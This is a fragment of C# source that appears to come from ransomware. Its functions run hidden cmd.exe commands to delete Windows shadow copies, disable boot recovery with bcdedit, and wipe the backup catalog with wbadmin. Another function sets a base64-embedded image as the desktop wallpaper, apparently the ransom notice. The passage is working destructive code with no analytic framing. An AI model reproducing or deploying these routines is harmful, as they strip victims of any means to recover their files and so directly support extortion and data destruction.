		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
